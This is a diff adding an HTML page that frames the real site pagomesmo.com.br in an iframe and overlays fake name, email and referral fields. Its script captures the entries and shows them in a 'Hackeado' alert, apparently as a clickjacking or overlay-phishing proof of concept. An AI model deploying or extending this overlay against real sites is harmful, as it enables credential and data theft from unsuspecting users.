@@ -1,0 +1,29 @@
+<html>
+<head>
+	<title>Pago Mesmo - Fake Site</title>
+	<link rel="stylesheet" type="text/css" href="/fake/css/style.css">
+</head>
+<body style="margin: 0">
+	<div class="fakeform">
+		<input placeholder=" " type="text" class="hijackInput" name="hijackNome">
+		<br>
+		<input type="text" placeholder=" " class="hijackInput" name="hijackEmail">
+		<br>
+		<input type="text" placeholder=" " class="hijackInput" name="hijackIndicacao">
+		<br>
+		<button type="button" class="btn btn-large">Enviar Fake</button>
+	</div>
+	<iframe src="https://www.pagomesmo.com.br" style="width: 100%; height: 900px; border-width:0" >
+	</iframe>
+	<script type="text/javascript">
+		const btn = document.getElementsByTagName('button')[0];
+		btn.addEventListener('click', function(argument) {
+			const nome = document.getElementsByName('hijackNome')[0];
+			const email = document.getElementsByName('hijackEmail')[0];
+			const indicacao = document.getElementsByName('hijackIndicacao')[0];
+
+			alert('Hackeado:\nnome=' + nome.value + '\nemail=' + email.value);
+		});
+	</script>
+</body>
+</html>
